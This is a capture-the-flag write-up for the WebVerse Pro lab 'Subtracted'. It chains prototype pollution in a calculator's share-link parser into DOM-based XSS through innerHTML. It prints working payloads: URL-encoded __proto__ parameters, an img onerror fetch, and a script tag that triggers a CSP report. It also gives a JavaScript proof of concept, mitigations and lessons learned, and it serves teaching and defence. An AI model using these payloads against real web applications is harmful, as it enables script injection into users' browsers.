---
title: "Prototype Pollution Leads to XSS | Subtracted"
date: 2026-07-05 12:30:00 +0530
categories: [A05 - Injection, Prototype Pollution]
tags: [prototype-pollution, dom-xss, csp, client-side, innerhtml, webverse-pro]
platform: WebVerse Pro
author: Kelvin
image:
  path: /assets/images/posts/subtracted-prototype-pollution-xss.webp
  alt: Subtracted prototype pollution to XSS
---

## Lab Link

[Subtracted](https://dashboard.webverselabs-pro.com/mystery-challenges/subtracted)

---

## Overview

**Subtracted** was a WebVerse Pro challenge built around a calculator application with shareable calculation links.

The application accepted calculator state through URL parameters and restored that state on the client side. During analysis, the share-link parsing logic was found to support nested object-style parameters such as `opts[key][value]`.

The issue was that the parser did not block dangerous object keys like `__proto__`. This allowed polluting `Object.prototype` and injecting a malicious `template` property. Later, the calculator rendering function trusted that template value and inserted it into the DOM using `innerHTML`.

By combining client-side prototype pollution with DOM-based HTML injection, it was possible to trigger JavaScript execution and then generate the CSP report expected by the challenge.

---

## Objective

The goal of the lab was to exploit the calculator share-link functionality and retrieve the challenge flag.

---

## Vulnerability Identification

The interesting functionality was located in the calculator page and its JavaScript assets.

The page loaded scripts similar to:

```html
<script src="/static/calc.js"></script>
<script src="/static/poll.js"></script>
```

The `calc.js` file handled calculation state and URL parsing. The vulnerable behavior was in the query-string parser, which accepted nested parameter syntax and assigned values into JavaScript objects without protecting against prototype pollution keys.

A malicious parameter such as this could poison the base object prototype:

```text
opts[__proto__][template]=...
```

Once this value was parsed, the injected property became available through normal object lookups:

```javascript
({}).template
```

The second issue appeared when the calculator result renderer used the polluted template value and inserted it into the page with `innerHTML`.

In simplified form, the dangerous behavior was:

```javascript
resultNote.innerHTML = cfg.template;
```

Because `cfg.template` could be inherited from `Object.prototype`, the attacker-controlled template was treated as trusted HTML.

---

## Root Cause

The root cause was unsafe recursive query parsing combined with unsafe DOM rendering.

The application failed to block prototype pollution keys:

```text
__proto__
constructor
prototype
```

It also rendered attacker-controlled content using `innerHTML` instead of treating the template as text or selecting it from a fixed allowlist.

---

## Exploitation

### 1. Confirm the client-side pollution path

The calculator state was restored from the URL. The vulnerable parameter shape was:

```text
opts[__proto__][template]
```

This allowed adding a `template` property to `Object.prototype`.

A first proof-of-concept payload was:

```html
<img src=x onerror="fetch('/__status.php?xss=1')">
```

Encoded into the calculator URL, the payload looked like this:

```text
/calc.php?calc=loan&amount=1&rate=1&years=1&opts%5B__proto__%5D%5Btemplate%5D=%3Cimg%20src%3Dx%20onerror%3D%22fetch('%2F__status.php%3Fxss%3D1')%22%3E
```

This confirmed that the polluted template reached the DOM and JavaScript execution was possible.

---

### 2. Understand the CSP challenge condition

The first payload executed, but it did not immediately solve the lab. This showed that the challenge was not only checking for generic XSS execution.

The page used a Content Security Policy with a report endpoint:

```text
report-uri /__csp-report.php
```

The solve condition depended on causing a browser-generated CSP report from the vulnerable calculator page.

A manually forged CSP report was not enough. The server expected a real browser-triggered report associated with the same session and the polluted calculator URL.

---

### 3. Trigger a real CSP report

To satisfy the challenge, the injected template needed to include a blocked script element. This caused Chromium to send a `script-src-elem` CSP violation report to the application.

Final payload:

```html
<script src=/x.js></script><img src=x onerror="fetch('/__status.php?xss=2')">
```

Final URL pattern:

```text
/calc.php?calc=loan&amount=1&rate=1&years=1&opts%5B__proto__%5D%5Btemplate%5D=<url-encoded-payload>
```

URL-encoded payload:

```text
%3Cscript%20src%3D%2Fx.js%3E%3C%2Fscript%3E%3Cimg%20src%3Dx%20onerror%3D%22fetch('%2F__status.php%3Fxss%3D2')%22%3E
```

Complete exploit path:

```text
/calc.php?calc=loan&amount=1&rate=1&years=1&opts%5B__proto__%5D%5Btemplate%5D=%3Cscript%20src%3D%2Fx.js%3E%3C%2Fscript%3E%3Cimg%20src%3Dx%20onerror%3D%22fetch('%2F__status.php%3Fxss%3D2')%22%3E
```

When this URL was opened in a real browser session:

1. The query parser polluted `Object.prototype.template`.
2. The result renderer inserted the polluted template using `innerHTML`.
3. The injected `<script src=/x.js>` violated the page CSP.
4. The browser posted a CSP report to `/__csp-report.php`.
5. The challenge status endpoint marked the session as solved.

---

## Proof of Concept

A headless Chromium session was used to open the exploit URL and preserve the same session cookies while polling the status endpoint.

Simplified browser-side proof:

```javascript
const payload = `<script src=/x.js></script><img src=x onerror="fetch('/__status.php?xss=2')">`;

const exploitUrl =
  '/calc.php?calc=loan&amount=1&rate=1&years=1' +
  '&opts%5B__proto__%5D%5Btemplate%5D=' +
  encodeURIComponent(payload);

location.href = exploitUrl;
```

After the browser generated the CSP violation report, the status endpoint returned the solved state and the flag.

---

## Proof / Flag

The flag was successfully retrieved from the lab status endpoint.

```text
WEBVERSE{REDACTED}
```

---

## Impact

This vulnerability allows an attacker to control inherited object properties used by application logic.

In this lab, the polluted property reached `innerHTML`, resulting in DOM-based XSS. In a real-world application, similar prototype pollution can lead to:

- Cross-site scripting
- Security control bypass
- Template injection
- Application logic corruption
- Denial of service
- Unexpected privilege or configuration changes

The impact depends on where polluted properties are later consumed.

---

## Mitigation

To prevent this class of vulnerability:

1. Block dangerous keys during parsing and object merging:

```javascript
const blockedKeys = ['__proto__', 'constructor', 'prototype'];

if (blockedKeys.includes(key)) {
  throw new Error('Blocked prototype pollution key');
}
```

2. Use objects without prototypes for untrusted dictionaries:

```javascript
const safeObject = Object.create(null);
```

3. Avoid recursive assignment into attacker-controlled object paths unless strictly necessary.

4. Never render user-controlled or URL-controlled data with `innerHTML`.

Use safer alternatives:

```javascript
element.textContent = value;
```

5. If HTML templates are required, use a strict allowlist and a trusted sanitizer.

6. Keep CSP enabled, but do not treat CSP as the only protection. CSP can reduce impact, but it does not fix unsafe DOM sinks.

---

## Lessons Learned

This lab showed how a small client-side parser bug can become exploitable when polluted properties are later trusted by rendering code.

The key takeaway is that prototype pollution is often not the final vulnerability by itself. The real impact appears when polluted values flow into sensitive sinks such as:

```javascript
innerHTML
eval
Function
script.src
template renderers
security configuration objects
```

In **Subtracted**, the vulnerable chain was:

```text
Nested URL parser → Object.prototype pollution → template inheritance → innerHTML → DOM XSS → CSP report → flag
```

Always review both sides of the chain: the pollution source and the sensitive sink.
